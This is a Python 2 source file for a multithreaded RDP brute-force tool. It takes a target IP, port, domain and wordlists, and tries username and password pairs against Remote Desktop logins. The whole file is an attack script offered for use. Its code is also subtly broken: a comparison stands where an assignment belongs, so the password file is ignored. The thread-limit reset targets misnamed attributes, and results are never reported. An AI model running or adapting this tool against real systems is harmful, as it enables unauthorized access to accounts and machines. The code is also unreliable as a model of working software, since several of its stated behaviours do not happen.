import random
from ClientConnect import clientConnect
from threading import Thread
import sys
import argparse


class RDPBruteForcer():
    def __init__(self):
        self.info = "RDP Brute Forcer"
        self.targetIp = ""
        self.domain = ""
        self.uep = ""
        self.targets = []
        self.usernames = []
        self.passwords = []
        self.connections = []
        self.amountOfThreads = 0
        self.currentThreadCount = 0

    def brute(self):
        parser = argparse.ArgumentParser(add_help = True, description = "Simple RDP Bruteforcer")
        requiredArgs = parser.add_argument_group('Required Arguments')
        requiredArgs.add_argument('-I', dest = 'targetIP', action = "store",required=True,  help= "Target IP Address")
        requiredArgs.add_argument('-U', dest = 'UsernamesFile', action ="store",required=True,   help='Usernames file')
        requiredArgs.add_argument('-P', dest = 'PasswordsFile', action ="store", help="Passwords file")
        requiredArgs.add_argument('-t', dest = 'threads', action = "store", type=int, default=10, help= "Amount of threads")
        requiredArgs.add_argument('-d', dest = 'Domain', action = "store",type=str, default="", help='Domain Default:""')
        requiredArgs.add_argument('-p', dest = 'targetPort', action = "store",type=int, default=3389, help='Target Port Default:3389')
        requiredArgs.add_argument('-UeP', dest = 'uep', action = "store",type=str, default="False", help='If true test only Username==password Default:False')
        requiredArgs.add_argument('-Timeout', dest = 'timeout', action = "store", type=int, default=15, help='Timeout Time')

        if len(sys.argv)==1:
           parser.print_help()
           sys.exit(1)
        options = parser.parse_args()

        self.targetIP = options.targetIP
        self.targetPort = options.targetPort
        self.amountOfThreads = options.threads
        self.timeoutTime = options.timeout
        self.domain = options.Domain
        self.usernames = self.fileToList(options.UsernamesFile)
        self.uep == options.uep
        if self.uep == "False" :
            self.passwords = self.fileToList(options.PasswordsFile)
        else:
            self.passwords = self.usernames
        self.startBrute()


    def startBrute(self):
        print "[*] {}".format(self.info)
        print "Target is : " + self.targetIP + ":" + str(self.targetPort)
        if self.uep == "False":
            for username in self.usernames:
                for password in self.passwords:
                   self.connectRDP(username, password, self.targetIP, self.targetPort, self.domain)
                   if self.currentThreadCount == self.amountOfThreads:
                       self.currentThreadResults()
            self.currentThreadResults()
        else:
            for username in self.usernames:
                self.connectRDP(username,username,self.targetIP,self.targetPort,self.domain)
                if self.currentThreadCount == self.amountOfThreads:
                    self.currentThreadResults()
            self.currentThreadResults()
                
    def connectRDP(self, username, password, targetIP, targetPort, domain):
        connect = Connect(username,password,targetIP, targetPort, domain)
        connect.start()
        self.connections.append(connect)
        self.currentThreadCount += 1

    def currentThreadResults(self):
        self.connection = []
        self.threadCount = 0

    def fileToList(self, fileName):
            lineList = []
            try:
                fileParser = open(fileName, 'r')

            except IOError:
                print(" Error opening file : " + fileName)

            except:
                print(" Error accessing file : " + fileName)
            

            for line in fileParser.readlines():
                newLine = line.replace('\n', '')
                lineList.append(newLine)

            return lineList



class Connect(Thread):
       
      def __init__(self,username,password,targetIP,targetPort, domain):

           super(Connect, self).__init__()

           self.username=username
           self.password = password
           self.targetIP = targetIP
           self.targetPort = targetPort
           self.domain = domain
           self.status = 0

      def run(self):
            self.status = clientConnect(self.targetIP,self.targetPort,self.username,self.password,self.domain, False)
            
if __name__ == '__main__':
    rdpBruteForce = RDPBruteForcer()
    rdpBruteForce.brute()
